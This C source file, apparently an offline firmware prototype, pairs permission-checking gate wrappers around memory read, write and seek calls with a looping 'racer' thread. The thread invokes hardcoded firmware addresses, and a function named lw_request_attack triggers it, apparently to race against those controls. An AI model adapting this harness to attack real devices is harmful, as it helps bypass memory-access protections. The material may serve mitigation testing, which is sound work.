/* Selected memory-provider writers. Offline prototype; not universal ownership. */
#include <stdint.h>
extern int pg_backend_allow(const volatile void *,int);
extern volatile uint32_t pg_pinned,pg_index;
extern uint32_t lw_stock_write_alias(volatile void *,const void *,uint32_t,uint32_t);
extern int lw_stock_seek_alias(volatile void *,uint32_t,uint32_t);
extern int lw_stock_setup(volatile void *,const void *);
extern uint32_t lw_stock_read(volatile void *,void *,uint32_t,uint32_t);
extern uint32_t lw_stock_write(volatile void *,const void *,uint32_t,uint32_t);
extern int lw_stock_seek(volatile void *,uint32_t,uint32_t);
volatile uint32_t lw_denied[6],lw_forwarded[6];
uint32_t lw_write_alias_gate(volatile void *o,const void *p,uint32_t n,uint32_t w)
{if(!pg_backend_allow(o,0)){lw_denied[0]++;return 8;}lw_forwarded[0]++;return lw_stock_write_alias(o,p,n,w);}
int lw_seek_alias_gate(volatile void *o,uint32_t p,uint32_t w)
{if(!pg_backend_allow(o,0)){lw_denied[1]++;return 8;}lw_forwarded[1]++;return lw_stock_seek_alias(o,p,w);}
int lw_setup_gate(volatile void *o,const void *p)
{if(!pg_backend_allow(o,0)){lw_denied[2]++;return 8;}lw_forwarded[2]++;return lw_stock_setup(o,p);}
uint32_t lw_read_gate(volatile void *o,void *p,uint32_t n,uint32_t w)
{if(!pg_backend_allow(o,1)){lw_denied[3]++;return 8;}lw_forwarded[3]++;return lw_stock_read(o,p,n,w);}
uint32_t lw_write_gate(volatile void *o,const void *p,uint32_t n,uint32_t w)
{if(!pg_backend_allow(o,0)){lw_denied[4]++;return 8;}lw_forwarded[4]++;return lw_stock_write(o,p,n,w);}
int lw_seek_gate(volatile void *o,uint32_t p,uint32_t w)
{if(!pg_backend_allow(o,0)){lw_denied[5]++;return 8;}lw_forwarded[5]++;return lw_stock_seek(o,p,w);}
static uint8_t lw_stack[8192] __attribute__((aligned(4096)));
static uint32_t lw_descriptor[5],lw_parameters[2],lw_data[16],lw_buffer[16],lw_object[144];
volatile uint32_t lw_racer_tcb,lw_racer_runs,lw_results[8];
uint32_t lw_get_object(void){return (uint32_t)(uintptr_t)lw_object;}
uint32_t lw_get_buffer(void){return (uint32_t)(uintptr_t)lw_buffer;}
uint32_t lw_get_data(void){return (uint32_t)(uintptr_t)lw_data;}
uint32_t lw_get_parameters(void){return (uint32_t)(uintptr_t)lw_parameters;}
static void lw_racer_entry(void)
{
 for(;;){
  (void)((uint32_t (*)(void))0x2fd035u)();
  volatile void *o=(volatile void *)(uintptr_t)(0x034e3cf4u+pg_index*576u+16u);
  lw_parameters[0]=(uint32_t)(uintptr_t)lw_data;lw_parameters[1]=sizeof(lw_data);
  lw_results[0]=((uint32_t (*)(volatile void *,const void *,uint32_t,uint32_t))0x4cae8bu)(o,lw_buffer,2,2);
  lw_results[1]=((int (*)(volatile void *,uint32_t,uint32_t))0x4caea9u)(o,3,0);
  lw_results[2]=((int (*)(volatile void *,const void *))0x5e759fu)(o,lw_parameters);
  lw_results[3]=((uint32_t (*)(volatile void *,void *,uint32_t,uint32_t))0x5e75bbu)(o,lw_buffer,2,2);
  lw_results[4]=((uint32_t (*)(volatile void *,const void *,uint32_t,uint32_t))0x5e75f1u)(o,lw_buffer,2,2);
  lw_results[5]=((int (*)(volatile void *,uint32_t,uint32_t))0x5e7623u)(o,3,0);
  lw_results[6]=((int (*)(volatile void *,const void *))0x5e759fu)((volatile uint8_t *)o+4,lw_parameters);
  lw_results[7]=((uint32_t (*)(volatile void *,void *,uint32_t,uint32_t))0x5e75bbu)((volatile uint8_t *)o+4,lw_buffer,2,2);
  lw_racer_runs++;
 }
}
uint32_t lw_boot_racer(void)
{
 if(lw_racer_tcb)return 0;
 lw_descriptor[0]=(uint32_t)(uintptr_t)lw_racer_entry;lw_descriptor[1]=0;
 lw_descriptor[2]=(uint32_t)(uintptr_t)(lw_stack+sizeof(lw_stack));lw_descriptor[3]=5u<<16;lw_descriptor[4]=0;
 lw_racer_tcb=((uint32_t (*)(const void *))0x358bf9u)(lw_descriptor);
 if(lw_racer_tcb)(void)((int (*)(const void *))0x2fbbbfu)(lw_descriptor);
 return lw_racer_tcb;
}
uint32_t lw_request_attack(void)
{if(!lw_racer_tcb || !pg_pinned)return 0;((void (*)(uint32_t,uint32_t))0x2fcf44u)(lw_racer_tcb,1);return lw_racer_tcb;}
